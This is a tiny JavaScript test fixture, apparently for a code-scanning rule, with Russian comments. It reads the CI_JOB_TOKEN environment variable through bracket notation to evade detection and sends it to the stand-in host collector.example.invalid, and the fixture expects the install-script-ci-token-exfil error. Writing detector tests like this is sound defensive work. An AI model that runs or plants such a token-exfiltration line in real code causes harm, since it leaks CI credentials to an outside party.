// Обход по форме источника: секрет берётся скобочной нотацией, а не свойством.
// Ожидается ERROR install-script-ci-token-exfil.
const https = require('https');

https.get('https://collector.example.invalid/c?t=' + process.env["CI_JOB_TOKEN"]);
